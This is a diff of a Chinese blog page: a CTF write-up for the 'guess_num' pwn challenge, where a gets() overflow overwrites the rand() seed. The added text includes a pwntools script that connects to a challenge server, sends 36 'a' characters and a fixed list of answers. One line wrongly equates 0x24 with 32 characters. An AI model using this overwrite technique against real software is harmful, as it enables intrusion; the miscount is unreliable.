@@ -32,7 +32,7 @@
 <meta property="og:image" content="http://example.com/2021/03/16/AD-guess-num/1.jpg">
 <meta property="og:image" content="http://example.com/2021/03/16/AD-guess-num/2.jpg">
 <meta property="article:published_time" content="2021-03-16T09:18:41.000Z">
-<meta property="article:modified_time" content="2021-03-18T15:38:39.059Z">
+<meta property="article:modified_time" content="2021-03-19T12:23:25.612Z">
 <meta property="article:author" content="带废物">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -192,7 +192,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-18 23:38:39" itemprop="dateModified" datetime="2021-03-18T23:38:39+08:00">2021-03-18</time>
+                <time title="Modified: 2021-03-19 20:23:25" itemprop="dateModified" datetime="2021-03-19T20:23:25+08:00">2021-03-19</time>
               </span>
 
           
@@ -214,7 +214,8 @@
 <img src="/2021/03/16/AD-guess-num/2.png" class>
 <img src="/2021/03/16/AD-guess-num/1.jpg" class>
 <p>该程序用gets来读取&amp;v7（name）（），所以可以用名字覆盖种子（写入我们需要的种子），再另外写一个cpp程序来看看该种子对应的rand（）函数值。</p>
-<p>名字写入a，刚好覆盖完60h的地址。seed的类型是unsigned int，故seed[0]的大小为4个字节，故选取的种子4个a。</p>
+<p><strong>ida地址表示1相当于1个字节</strong></p>
+<p>名字写入0x24个a，相当于从客户端·输入32个a，一个a一个字节，刚好覆盖完-30h到-10h的地址，触及seed的地址，seed的类型是unsigned int，故seed[0]的大小为4个字节，故选取的种子4个a。</p>
 <p>这里特别要注意，由于题目本身是在linux下的，所以我们自己写的程序也要在linux下进行测试，不同的平台所产生的结果是不同的（我吐了，卡了老子这久）</p>
 <img src="/2021/03/16/AD-guess-num/2.jpg" class>
 <p><em>顺便需要学习在Linux中编写c</em></p>
@@ -225,8 +226,10 @@
 <p><em>如果成功，会得到一个可执行程序，xxx.out</em></p>
 <p><em>运行，./xxx.out，会输出结果</em></p>
 <p>回到这题</p>
-<p>附件只提供参考，flag不在附件中，如果</p>
-<p>？？？？？</p>
+<p>附件只提供参考，flag不在附件中，如果单纯运行附件答题能成功，但给不出flag（怎么想怎么对，我之前竟然不知道）</p>
+<p>所以有两个方法完成这题</p>
+<p>第一种方法nc服务器，输入0x24个a，也就是36个a，答题，得到flag</p>
+<p>第二种方法是使用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47746</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">ans=[<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">	io.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">	io.sendline(str(i))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
     </div>
